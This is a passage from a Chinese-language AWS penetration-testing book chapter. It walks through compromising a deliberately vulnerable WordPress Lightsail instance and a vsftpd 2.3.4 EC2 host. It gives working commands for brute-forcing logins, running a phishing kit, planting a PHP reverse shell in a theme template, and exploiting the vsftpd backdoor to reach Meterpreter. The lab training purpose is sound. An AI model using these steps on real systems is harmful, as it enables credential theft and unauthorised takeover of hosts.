+   Amazon Lightsail：[`aws.amazon.com/lightsail/`](https://aws.amazon.com/lightsail/)

+   钓鱼工具：[`github.com/xHak9x/SocialPhish`](https://github.com/xHak9x/SocialPhish)

查看以下视频，了解代码的实际操作：[`bit.ly/3kPcjNL`](https://bit.ly/3kPcjNL)

# 使用 Metasploit 进行真实渗透测试

在本书中，我们已经谈论了**Metasploit**相当多，并且甚至在 Metasploit 中使用了一些模块来帮助我们评估本书中的各种练习 - 但是，这些例子只是浅尝辄止，Metasploit 的真正潜力以及在云中进行渗透测试和道德黑客的潜力。

Metasploit 在渗透测试社区中有好坏参半的评价，因为它帮助自动化了我们的许多流程，可能被认为是廉价的或者是依赖自动化工具来进行渗透测试的新手。然而，作为一个以渗透测试为生的人，Metasploit 提供了巨大的优势，并自动化了许多无聊和简单的工作，同时让你专注于需要更多手动方法的评估的详细部分。在本章中，我们将看到如何利用 Metasploit，同时使用其他各种技术来帮助我们利用服务和系统。

重要提示

永远不要依赖一个工具来完成渗透测试工作。作为渗透测试人员，我们的工作是有效和高效地提供对真实攻击者的评估，同时评估目标组织的整体安全状况。

在本章中，我们将把我们从前面所有章节中学到的知识应用到我们的云环境中，使用你在实际渗透测试中可能遇到的真实场景。

我们将采取两种方法：

+   白盒/功能测试

+   没有黑盒测试的知识

## 什么是功能测试？

在我们开始之前，我想快速提一下功能测试是什么。它基本上和白盒测试是一样的；只是主要目标是确保环境中的应用和服务安全且正常运行，而渗透测试允许你寻找更多问题，并发现当某些东西没有正确或安全地运行时。

功能测试在云渗透测试中起着至关重要的作用，因为云渗透测试需要不同的方法。由于服务提供商方面的安全性非常发达，云环境中发现的大多数问题都源自用户的实施。我们已经亲眼见证了在*第四章*等章节中，过度宽松的政策会导致什么，以及这如何允许攻击者利用 S3 等服务。我们基本上是通过已经拥有凭证来评估我们的环境，应用了相同的方法论。

拥有凭证并寻找令人兴奋的资源和破损的政策使我们渗透测试人员能够在坏人之前发现问题。确保在进行 AWS 渗透测试时，渗透测试团队具有一些凭证访问权限，这将使他们能够高效地对 AWS 环境进行功能测试至关重要。

我们将在本章的最后看更多的功能测试，在*探索 AWS Metasploit 模块*部分。

## 黑盒测试

虽然我们在*第二章*中提到了**黑盒测试**，*渗透测试和道德黑客*，我想在这里再次简要提及它，因为我们将把它应用到本章的场景中。对于本章的场景来说，云的黑盒测试意味着我们对目标或其环境没有任何细节。然而，我们至少会知道目标主机的 DNS 或 IP 地址 - 这使我们能够节省时间并找到目标。

重要提示

黑盒测试有时可能是浪费时间，因为大部分测试时间都花在枚举信息上，因为渗透测试团队没有关于评估的任何先前知识。

这意味着渗透测试团队需要自己去找到进入应用程序和 AWS 云环境的方法。这包括钓鱼和暴力破解以找到 Web 应用程序和 AWS 环境的凭证，以及任何其他类型的社会工程。我们可以利用本书和本章中学到的策略来帮助我们访问本章中故意脆弱的系统。

现在我们已经了解了我们将要进行的测试类型，让我们开始朝着基于场景的测试迈进。在我们开始之前，我们需要确保一些事情有条不紊，并且在测试开始之前我们已经做好了准备。

# 渗透测试前期

在我们开始之前，我们需要确保我们的环境已经准备好进行渗透测试。这意味着我们需要确保我们的 AWS 网络已经设置好，并且我们使用的任何工具都已经更新。除了本书中的环境之外，始终重要的是要记住在进行渗透测试之前检查您的设置是否正确。如果您的设置没有准备好，您很可能会遇到问题，这将阻碍您进行成功的渗透测试；或者至少在渗透测试过程中会遇到一些挫折，这将耽误您的时间。

对于本节，让我们确保我们在正确的**虚拟私有云**（**VPC**）上，并且我们的目标已经配置好。这确保我们可以直接访问其私有网络上的机器，并且在尝试访问 AWS 环境的内部时不会遇到任何问题。我们还需要确保 Metasploit 已经更新，并且安装了最新的模块，以便我们可以使用它们来利用我们的目标。

## 重命名我们的 VPC 以便更清晰

让我们继续重命名我们的 VPC。请记住，VPC 充当我们正在使用的主机的虚拟私有云网络。我们一直在使用相同的 VPC 来设置主机；然而，我们从未重命名它，因为它与我们的目标和任务无关。

要重命名您的 VPC，请登录 AWS 控制台并按照以下步骤操作：

1.  在 AWS 控制台的主要搜索框中搜索`VPC`一词：![图 9.1-搜索 VPC](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.01_B15630.jpg)

图 9.1-搜索 VPC

1.  点击**VPCs**：![图 9.2-选择 VPC 选项](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.02_B15630.jpg)

图 9.2-选择 VPC 选项

1.  您将看到一个 VPC 列表。选择包含 Kali 实例的 VPC 并将其重命名。我们已经将我们的 VPC 重命名为**Pentest Playground**：

![图 9.3-重命名我们的 VPC](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.03_B15630.jpg)

图 9.3-重命名我们的 VPC

就是这样！我们现在已经重命名了我们的 VPC，这将使得以后的工作变得更加容易，因为我们可以自动将任何目标主机放在该 VPC 中。接下来，让我们继续更新我们的主要工具 Metasploit。

## 更新 Metasploit

在继续进行渗透测试之前，我们需要做最后一件事-我们需要更新我们 Kali Linux 机器上的 Metasploit。我们将使用托管在 AWS 中的 Kali 机器，因此请确保您已经启动并访问了该实例。要访问该机器，请使用以下命令：

```
$ ssh -i <key.pem> <public dns>
```

一旦您获得对 Kali 机器的访问权限，请继续输入以下命令来更新 Kali 主机中的 Metasploit 应用程序：

```
$ apt update; apt install metasploit-framework
```

让它运行一分钟并更新。完成后会提示您，然后可以继续。

现在我们的环境已经准备好了，是时候继续进行一些真正的渗透测试场景了。以下场景模拟了故意制造的易受攻击环境，模仿了真实环境中常见的问题。我们还将进行一些其他练习，使用 AWS 作为平台，以帮助提升您对渗透测试的了解，并展示 AWS 在渗透测试和攻击性安全方面的一些能力。

# 针对 WordPress 进行利用

对于我们的第一个渗透测试，我们将对一个名为 WordPress 的目标应用进行渗透测试，这是一个非常流行的用于博客和快速构建网站的网站。在渗透测试中，WordPress 网站成为目标并不罕见，因为它们非常灵活，而且非常简单易上手-正如我们将在下一刻看到的。如果您想了解更多关于 WordPress，请访问这里：[`wordpress.com/`](https://wordpress.com/)。

现在，让我们看看实际的情景是什么，以及我们被要求测试什么，以及如何测试。

重要提示

测试要求会因测试而异。有些目标可能只需要初始访问，而其他目标则需要完整的后期利用。这种情况完全取决于客户及其需求。

## 情景-获取未经授权的访问权限

在这种情况下，我们被要求针对一个 WordPress 网站进行攻击，并查看是否能够获得任何类型的访问权限。目标怀疑管理员很懒惰，并且已经实施了弱凭证来访问 Web 应用程序和后端主机。因此，根据目标的要求，这意味着我们需要访问 Web GUI 并通过反向 shell 访问主机系统。

我们可以通过几种不同的方法来做到这一点，比如蛮力攻击和社会工程学。我们将使用 Metasploit 并使用一个开源工具对目标进行网络钓鱼演习。在获得凭证后，我们将访问应用程序，并尝试通过在 Web 应用程序上放置后门来访问主机系统。

在进行渗透测试之前，我们需要首先搭建一个带有 WordPress 的 Web 服务器。我们可以使用一个名为**Lightsail**的服务来快速执行这个操作。

## 使用 Lightsail 设置目标

这一次在设置服务器时，我们将使用一种略有不同的方法。过去，我们使用 EC2 实例来配置主机和应用程序。现在，我们几乎要完全自动化整个过程，使用一个名为**Lightsail**的服务。

Lightsail 是 AWS 中的一个功能，允许我们在几分钟内构建应用程序。这对需要在几分钟内启动服务器和网站的管理员非常有效；然而，正如我们将在这个渗透测试场景中看到的那样，有时可能会出现一些常见问题。通常，简单的凭据和过度宽松的访问会打开脆弱的大门，使攻击者找到进入应用程序的方法！

现在，让我们先担心用 Lightsail 搭建我们的目标。如果您愿意，您可以在这里了解更多关于 Lightsail 的信息：[`aws.amazon.com/lightsail/`](https://aws.amazon.com/lightsail/)。

要开始，您需要登录到您的 AWS 帐户，网址是[aws.amazon.com](http://aws.amazon.com)。登录后，您可以在这里进入 Lightsail：[`lightsail.aws.amazon.com`](https://lightsail.aws.amazon.com)。

一旦您登录到 Lightsail 仪表板，您需要创建一个实例并配置它以适应我们易受攻击的目标场景。以下步骤将帮助您了解如何执行此操作：

1.  单击**创建实例**。

1.  选择**WordPress**应用程序，并在 Linux 镜像上构建它：![图 9.4 - 选择我们的 Lightsail 镜像，带有 WordPress 和 Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.04_B15630.jpg)

图 9.4 - 选择我们的 Lightsail 镜像，带有 WordPress 和 Linux

1.  现在我们需要选择一个计划。选择**最便宜的计划**，可以免费使用一个月。您随时可以取消：![图 9.5 - 选择具有免费月份选项的计划，以避免收费](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.05_B15630.jpg)

图 9.5 - 选择具有免费月份选项的计划，以避免收费

1.  给您的实例命名！在这种情况下，我们将我们的实例命名为`WordPress-Metasploit`，以保持简单：![图 9.6 - 为熟悉性命名我们的实例](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.06_B15630.jpg)

图 9.6 - 为熟悉性命名我们的实例

1.  单击**创建实例**。

现在，我们应该有一个正在运行的仪表板与我们的新实例！

![图 9.7 - 我们在 Lightsail 中加载的实例](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.07_B15630.jpg)

图 9.7 - 我们在 Lightsail 中加载的实例

接下来，我们将使这个实例变得脆弱，以便我们可以攻击它。我们需要做的第一件事是登录并更改登录密码。当您到达 Lightsail 仪表板时，您会看到**使用 SSH 连接**。单击该按钮将为我们提供 WordPress 主机内的 SSH 终端。

让我们继续进行下一步，设置我们的易受攻击主机：

1.  单击**使用 SSH 连接**：![图 9.8 - 连接到主机系统](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.08_B15630.jpg)

图 9.8 - 连接到主机系统

1.  这将在您的浏览器中创建一个 SSH 窗口。在终端中键入`ls`以列出应用程序中的任何文件和目录：![图 9.9 - 列出主机中的文件](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.09_B15630.jpg)

图 9.9 - 列出主机中的文件

1.  使用`cat`命令列出应用程序密码文件！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.10_B15630.jpg)

图 9.10 - 列出密码文件的内容

1.  现在我们有了密码，让我们去登录地址，并使用密码和用户名登录到 Web 应用程序。登录地址将是`http://<publiciP>/wp-login.php`：![图 9.11 - 登录到我们的 WordPress 主机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.11_B15630.jpg)

图 9.11 - 登录到我们的 WordPress 主机

1.  登录后，转到**用户**部分，然后单击**添加新用户**：![图 9.12 - 添加新用户](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.12_B15630.jpg)

图 9.12 - 添加新用户

1.  现在，继续创建一个名为`admin`的新用户，并将密码设置为`admin`：![图 9.13 - 创建管理员帐户](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.13_B15630.jpg)

图 9.13 - 创建管理员帐户

1.  创建用户后，您需要确保它是**管理员**角色组的一部分：

![图 9.14 - 将管理员角色分配给我们的管理员帐户](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.14_B15630.jpg)

图 9.14 - 将管理员角色分配给我们的管理员帐户

现在，我们的目标已经成功设置了一些容易受攻击的问题，这将使我们能够发现应用程序中的弱点。请记住，我们只是将应用程序设置为管理员，但我们是作为渗透测试人员对其进行攻击。这意味着我们知道应用程序的凭据。

让我们开始并开始渗透测试！

## 枚举目标

好了，现在舞台已经搭好，我们准备开始对目标进行渗透测试。我们需要做的第一件事是回到我们的 AWS Kali Linux 实例上。一旦你能够访问你的 Kali 主机，让我们开始扫描目标应用程序，看看我们发现了哪些端口和服务作为潜在的入口点：

```
$ nmap -Pn -sV <public DNS>
```

输出如下所示：

![图 9.15 - 扫描我们的 WordPress 主机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.15_B15630.jpg)

图 9.15 - 扫描我们的 WordPress 主机

如你所见，打开的端口和服务是 web 服务端口和 SSH。由于我们只被要求测试 WordPress 应用程序，所以我们可以继续而不用担心 SSH，因为从技术上讲，它不在测试范围内。

重要提示

始终记住要在请求的渗透测试范围内活动。超出范围可能导致罚款、收入损失、信任丧失和诉讼。

现在我们知道我们可以访问端口`80`和`443`上的 web 端口，让我们开始向前迈进，看看我们可以从网站中使用 Metasploit 中的 WordPress 模块进行枚举。这是下一个逻辑步骤，因为我们已经知道目标正在托管 WordPress - 如果我们不知道，我们将首先尝试通过浏览器访问站点，看看 web 服务端口上运行的是什么应用程序。

以下命令将启动 Metasploit 并扫描我们的目标：

1.  启动 Metasploit：

```
$ msfdb run
```

下一个截图将让你看到 Metasploit 终端的外观：

![图 9.16 - 启动 Metasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.16_B15630.jpg)

图 9.16 - 启动 Metasploit

1.  现在，我们需要继续选择 Metasploit 中的一个**扫描模块**，用于枚举**WordPress**的版本：

```
$ use auxiliary/scanner/http/wordpress_scanner
```

这将产生以下输出：

![图 9.17 - 发现 WordPress 5.3.4](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.17_B15630.jpg)

图 9.17 - 发现 WordPress 5.3.4

1.  看起来我们可能正在处理一个过时的**WordPress**版本。如果目标托管过时的应用程序，这些应用程序可能存在易受攻击和系统妥协的漏洞。现在，我们将查看与**5.3.4**相关的漏洞。你可以在这里找到与这个版本相关的漏洞：[`wpvulndb.com/wordpresses/53`](https://wpvulndb.com/wordpresses/53)。

我们没有找到任何突出的易受攻击的东西，所以现在我们可以继续看看是否可以通过手动枚举发现任何用户名。

要开始枚举用户名信息，我们需要去查看我们的 WordPress 应用程序的登录页面。我们将通过输入随机用户名开始评估，直到我们在用户名上找到一个精确匹配。这将允许我们使用已知的用户名和密码列表进行**暴力破解**，并且会花费更少的时间，因为我们只需要搜索密码，而不是用户名。

首先，转到`http://<public dns>/wp-login.php`的登录页面。一旦到达那里，开始使用一些常见的用户名来登录页面。在我们的情况下，我们将尝试使用`root`和`user`。

让我们开始吧：

1.  输入`root`作为用户名，`password`作为密码：![图 9.18 - 找不到用户名](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.18_B15630.jpg)

图 9.18 - 找不到用户名

如你所见，用户名未找到 - 这意味着这个用户名在这个应用程序中不存在。

1.  接下来，我们将尝试输入`user`作为用户名：![图 9.19 - 找到用户名](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.19_B15630.jpg)

图 9.19 - 找到用户名

现在我们可以看到我们已经找到了用户名，因为提示告诉我们`user`用户名是有效的，让我们看看如何使用 Metasploit 自动发现凭据。

1.  首先，您需要创建一个文件来放置用户名。如果我们找到更多的用户名，我们以后也可以使用这个文件。

继续将`user`打开到文件中：

```
vi Terminal and placing the word user within the file.![Figure 9.20 – Creating a file with user     ](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.20_B15630.jpg)Figure 9.20 – Creating a file with user 
```

1.  接下来，我们需要保存文件。键入`:wq`以保存并退出。

我们已经准备好使用我们的用户名文档；现在，我们只需要在目标主机上使用它。我们将再次依靠 Metasploit 来完成这项任务。Metasploit 有一个登录枚举模块，将帮助我们为我们发现的用户找到一些密码。一旦您启动了 Metasploit，请使用以下命令配置您的 Metasploit 模块以适应您的目标：

```
$ usemodules/auxiliary/scanner/http/wordpress_login_enum
$ set PASS_FILE /usr/share/wfuzz/wordlist/general/common.txt
$ set USER_FILE wordpressUsers.txt
$ set RHOSTS <target public dns>
$ run
```

请注意，在下一个截图中，我们找到了用户`user`：

![图 9.21–暴力破解和找到用户](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.21_B15630.jpg)

图 9.21–暴力破解和找到用户

正如您所看到的，我们找到了用户和密码。下一张截图突出显示密码是`admin`：

![图 9.22–发现密码](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.22_B15630.jpg)

图 9.22–发现密码

干得好！我们成功地收集了 WordPress 应用程序的凭据。虽然我们可以在这里停止枚举并继续尝试利用应用程序，但让我们采取另一种方法来获取其他凭据，以便让我们访问应用程序–毕竟，您拥有的凭据越多，越好！

接下来，我们将尝试通过使用开源网络钓鱼工具来获取更多的凭据。

## 收集凭据

本节的下一部分涉及向目标公司发送恶意链接，以尝试获取额外的凭据，从而使我们能够访问 Web 应用程序。**网络钓鱼**是一种涉及发送恶意电子邮件的**社会工程**攻击，试图模仿合法电子邮件。总体目标是让用户点击电子邮件或应用程序中的链接或下载，然后在目标上安装恶意软件或收集信息。在我们的情况下，我们将使用它来收集额外的凭据。

重要提示

在本练习中，我们不会向任何人发送虚假电子邮件。我们将假设已发送了一个非常描述性的电子邮件，并附有恶意链接。

要开始，我们需要获取一个名为**Social Phish**的程序，并将其放在我们的**AWS Kali 主机**上。要获取该应用程序，请使用以下命令：

```
$ git clone https://github.com/xHak9x/SocialPhish
```

在您的 Kali 机器上安装应用程序后，继续运行应用程序：

```
$ bash socialphish.sh
```

接下来，按照以下步骤执行攻击：

1.  现在应用程序正在运行，您需要确保选择**WordPress**模板：![图 9.23–设置我们的网络钓鱼应用程序](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.23_B15630.jpg)

图 9.23–设置我们的网络钓鱼应用程序

1.  在选择**WordPress**模板后，继续将**tinyURL**放入浏览器中。这将使用您的 Kali 主机的公共 DNS 进行访问：![图 9.24–来自网络钓鱼链接的假 WordPress 网站](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.24_B15630.jpg)

图 9.24–来自网络钓鱼链接的假 WordPress 网站

1.  正如您所看到的，我们看起来有一个正常的 WordPress 网站。我们可以欺骗用户将他们的凭据放入输入框中，从而窃取登录信息。继续使用 WordPress 应用程序的合法凭据：![图 9.25–发现的凭据](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.25_B15630.jpg)

图 9.25–发现的凭据

1.  在输入凭据后，您将在终端上收到登录信息，并且它将存储在系统上的文件中。

现在我们有了可以用来访问应用程序的凭据，让我们继续对 WordPress 应用程序进行更多的渗透测试，看看我们能做些什么。

## 获取 WordPress 的访问权限

这是评估中最短的部分。我们需要确保我们发现的凭据能够让我们访问网页。始终尝试你发现的凭据是很重要的，因为它们可能是**误报**的结果，或者在你尝试使用它们时已经被更改。

在我们的情况下，我们将返回到目标主机的登录页面，并使用我们发现的凭据：

![图 9.26 – WordPress 仪表板](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.26_B15630.jpg)

图 9.26 – WordPress 仪表板

如你所见，我们已成功访问了系统。既然我们已经获得了访问权限，让我们继续尝试利用应用程序并访问底层主机操作系统。

## 利用并获取反向 shell

现在是时候看看我们是否能在目标应用程序上获得**反向 shell**并**保持持久性**了。在一个易受攻击的 Web 应用程序上保持持久性向目标客户展示了他们的系统可以被*轻松*接管。此外，这也是一个更可怕的问题之一，因为它很难被检测到，并且允许未经授权的用户访问主机系统 - 这有时可能导致完全妥协。

要开始我们在目标上获取反向 shell 的旅程，我们需要找到一些可以注入或放置可执行代码的区域：

1.  首先，让我们去看看**主题编辑器**：![图 9.27 – WordPress 主题编辑器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.27_B15630.jpg)

图 9.27 – WordPress 主题编辑器

1.  我们将有很多模板可供选择。让我们使用**404 模板**：

```
http://<public DNS>/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty
```

这可以如下所示：

![图 9.28 – 带有我们代码的 WordPress 主题编辑器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.28_B15630.jpg)

图 9.28 – 带有我们代码的 WordPress 主题编辑器

1.  我们将以下代码放入模板中。设置`443`。此代码可以在此处找到：

[`github.com/PacktPublishing/AWS-Penetration-Testing/blob/master/Chapter%209:%20Real-Life%20Pentesting%20with%20Metasploit%20and%20More!/phpshell.php`](https://github.com/PacktPublishing/AWS-Penetration-Testing/blob/master/Chapter%209:%20Real-Life%20Pentesting%20with%20Metasploit%20and%20More!/phpshell.php)

1.  现在，我们需要在我们的 Kali Linux 主机上启动`netcat`来监听连接：

```
$ nc -lnvp 443
```

1.  现在我们需要尝试访问包含我们代码的完整 URL。我们可以使用`curl`命令来做到这一点：

```
$ curl http://<public dns>/wp-content/themes/twentytwenty/404.php
```

这将产生以下输出：

![图 9.29 – 来自我们目标主机的反向 shell](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.29_B15630.jpg)

图 9.29 – 来自我们目标主机的反向 shell

好的，所以我们使用了我们的精巧有效载荷获得了一个**Netcat** shell。然而，现在让我们通过获取一个**Meterpreter** shell 来简化事情！我个人觉得 Meterpreter shells 更令人愉悦，因为你可以在 Metasploit 中使用它们，并且它们具有典型 shell 所没有的额外功能。

要获得一个 Meterpreter shell，我们将在 Metasploit 中使用一个 WordPress 漏洞。我们将使用我们在评估中发现的凭据，以及我们的 AWS Kali Linux 主机来捕获传入的连接。

一旦你启动了 Metasploit，使用以下命令加载你的模块并配置它以针对主机：

```
$ use exploit/unix/webapp/wp_admin_shell_upload
$ set password admin
$ set username admin
$ set rhosts <Target Public DNS>
$ set lhost <AWS Kali Public DNS>
$ set lport 443
$ run
```

这将产生以下输出：

![图 9.30 – 来自我们目标主机的 Meterpreter 反向 shell](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.30_B15630.jpg)

图 9.30 – 来自我们目标主机的 Meterpreter 反向 shell

如你所见，我们已成功使用**Netcat** shell 和**Meterpreter** shell 获得了对主机操作系统的访问权限。从外观上看，这个应用程序相当不安全，并且几乎没有任何安全措施。现在我们已经完成了对这个应用程序的渗透测试，是时候继续讨论问题以及如何与他人讨论如何解决这些问题了。

## 讨论问题

一旦渗透测试结束，与目标讨论一些在渗透测试期间发现的问题是至关重要的。同样非常重要的是，避免使用可能会让非技术人员客户感到困惑的极其技术性的术语。让客户感到困惑或被技术术语压倒实际上可能会让客户离开，并且他们可能不会推荐你进行另一次渗透测试。

以下是我们将写给客户并附上渗透测试结果的声明：

在 WordPress 应用程序的渗透测试中，渗透测试人员成功地通过猜测和社会工程学提取了密码。社会工程包括向用户发送恶意链接，希望其中一些人会点击该链接并在看起来像客户网站的地方输入他们的凭据。

获得访问权限后，渗透测试人员继续前进，并在 Web 应用程序中放置了恶意代码，然后可以用来授予对目标服务器的未经授权访问。

建议客户培训其员工不要点击恶意链接，并且工程师不要为任何应用程序使用弱凭据。还建议审查密码策略，以防止未来创建简单的用户名和密码。如果您有任何问题，请告知，我们期待再次与您合作。

正如您所看到的，我们避免使用任何技术性术语，并建议如何解决问题。这让目标客户明白我们在这里是来帮助他们的，并且我们将与他们合作解决问题 – 最终巩固与客户业务的关系。

现在我们已经在 WordPress 黑客攻击中动手玩了一番，让我们来看看在评估 AWS 环境时可能遇到的一些不同问题。接下来，我们将开始研究如何发现托管在 EC2 上的易受攻击的应用程序。

# 针对易受攻击的服务应用程序

**易受攻击的服务**是环境中可能存在的最糟糕的问题之一，也是最容易修复的问题之一，*但并非总是最便宜的*。随着应用程序变老，构建应用程序所使用的代码也变老，而随着时间的推移，旧应用程序的漏洞也在增加。不幸的是，尽管简单地修补或更新旧软件听起来很容易，但实际上是非常昂贵和耗时的。更新应用程序可能需要大量时间，并且会使应用程序使用的服务停机。这意味着收入和可用性的损失。

在下一个场景中，我们将看到在 AWS 网络上易受攻击的应用程序造成的真正损害。

## 场景 – 发现和攻击任何易攻击的目标

在这种情况下，客户要求对他们怀疑存在易受攻击的应用程序进行渗透测试。该应用程序目前托管在其 AWS 环境中，并且可以从全球范围内的互联网公开访问。客户希望了解 Web 应用程序的易受攻击程度以及如果攻击者利用该应用程序并获得访问权限，会出现什么问题。

客户告诉我们，该应用程序用于文件存储，因此我们可以假设它很可能是某种类型的`21`。这就是我们将开始进行渗透测试的地方。

当然，在进行此操作之前，我们需要先设置环境。

## 使用社区 AMI 设置目标

要开始，我们需要转到 EC2 控制台，该控制台可以通过主 AWS 控制台访问。一旦您访问了 EC2 控制台，请点击**启动实例**，快速地启动一个易受攻击的实例：

1.  在选择**启动实例**后，让我们选择**vsftpd-2-3-4-final**社区 AMI：![图 9.31 – 启动我们的社区镜像](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.31_B15630.jpg)

图 9.31 – 启动我们的社区镜像

1.  你需要确保实例与其他正在运行的实例在同一个**VPC**中。我们将把它放在我们的**Pentest Playground** VPC 中。

1.  跳到最后，生成密钥对，并启动实例！

就这么简单，我们的实例已经准备就绪。但是，请给实例几分钟的时间来加载并分配地址，以便我们可以访问它。

接下来，我们将继续进行渗透测试，看看我们可以发现哪些潜在易受攻击的应用程序问题。

## 扫描打开的端口

一如既往，我们想要`21`，我们想要检查任何其他端口，以防我们忽视了某些东西。

在你的**AWS Kali**实例上启动**Metasploit**，并使用以下命令选择和配置模块来对我们的目标进行端口扫描：

```
$ use auxiliary/scanner/portscan/tcp
$ set rhosts ec2-54-189-99-52.us-west-2.compute.amazonaws.com
```

这将给我们以下输出：

![图 9.32 - 使用 Metasploit 扫描我们的主机的端口](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.32_B15630.jpg)

图 9.32 - 使用 Metasploit 扫描我们的主机的端口

正如你所看到的，我们在主机上打开了端口`22`和端口`21`。我们可以确认我们的怀疑，端口`21`确实是打开的。既然我们已经确认它是打开的，让我们继续收集有关端口`21`的更多信息。

## 对易受攻击的服务进行信息收集

继续前进，我们需要确定运行在端口`21`上的应用程序和版本号。为了帮助我们发现这一点，我们将使用`nmap`来扫描端口`21`并枚举该服务的版本：

```
$ nmap -sV -p21 ec2-54-189-99-52.us-west-2.compute.amazonaws.com
```

这将给我们以下输出：

![图 9.33 - 使用 Nmap 扫描我们的主机](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.33_B15630.jpg)

图 9.33 - 使用 Nmap 扫描我们的主机

我们现在知道了托管在目标主机上的文件服务的版本。正如你所看到的，`vsftpd 2.3.4`是系统上运行的应用程序的版本。让我们使用一个名为**SearchSploit**的程序来查看是否有我们可以针对我们的目标使用的任何漏洞利用：

```
$ searchsploit vsftpd 2.3.4
```

这将给我们以下输出：

![图 9.34 - 搜索漏洞](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.34_B15630.jpg)

图 9.34 - 搜索漏洞

看起来有一个**Metasploit**模块，我们可以用来利用我们的目标。我们现在有足够的信息来尝试利用我们的目标，希望能够访问目标系统。

## 使用 Metasploit 进行系统全面接管

有了关于目标的所有信息，让我们开始转变思路，进入攻击模式。要攻击应用程序，我们需要启动 Metasploit 并配置模块以适应当前目标：

```
$ use exploit/unix/ftp/vsftpd_234_backdoor
$ set rhosts <target host>
$ exploit
```

这给我们带来了以下输出：

![图 9.35 - 在目标主机上获取 root shell](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.35_B15630.jpg)

图 9.35 - 在目标主机上获取 root shell

正如你所看到的，我们有一个 root shell！这意味着我们完全控制了我们的目标，并可以对系统上的一切进行更改。然而，我们的 shell 可能需要在你的 shell 终端中再加一点“背景”。

现在我们回到了我们的 Metasploit 终端，让我们使用`shell_to_meterpreter`模块来升级我们当前的 shell。以下内容将为我们选择和配置这个模块：

```
$ use post/multi/manage/shell_to_meterpreter
$ set session 1
$ set lhost <public dns kali AWS>
$ exploit
```

你会看到以下输出：

![图 9.36 - 升级到 Meterpreter shell](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.36_B15630.jpg)

图 9.36 - 升级到 Meterpreter shell

正如你所看到的，我们现在有了`vsftpd`漏洞利用，第二个 shell 是我们新升级的 shell。要访问我们的新 Meterpreter shell，请使用以下命令：

```
$ session -i 2
```

太棒了 - 现在我们有了一个 Meterpreter shell，我们可以用它来利用环境中的更多潜在问题。让我们继续讨论并执行一些常见的方法，你可以成功地利用这个特定的主机进行更多的道德黑客乐趣。

## 后期利用和削弱其他服务

太好了，我们现在可以访问我们的系统了 - 想看看我们还能做什么吗？我们已经有了 root 访问权限，这意味着我们可以对我们的受攻击目标做几乎任何我们想做的事情。

在我们开始之前，让我们看看这个主机所在的网络。现在我们已经利用了它，我们都可以访问私有 AWS 网络，并可以使用**公共 IP**和**DNS**名称进行攻击。

重要提示

在一次真正的渗透测试中，您可以在私有 AWS 网络内部进行枢纽转移，并发现更多可能对公众不可访问的主机！

让我们继续在目标主机上运行`ifconfig`来查看我们的网络信息：

![图 9.37 – 从目标主机获取网络信息](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_9.37_B15630.jpg)

图 9.37 – 从目标主机获取网络信息

正如您所看到的，我们在`eth0`接口上找到了内部网络！虽然我们不会在这里进行任何枢纽转移，但重要的是要理解，从一个主机到另一个主机的枢纽转移是非常危险的 – 对系统来说是危险的。能够在网络内部进行枢纽转移而不被发现的黑客通常永远不会被抓住，并且可以在网络内部停留很长时间。重要的是要有日志记录和监控解决方案，以确保攻击者无法在网络中移动。

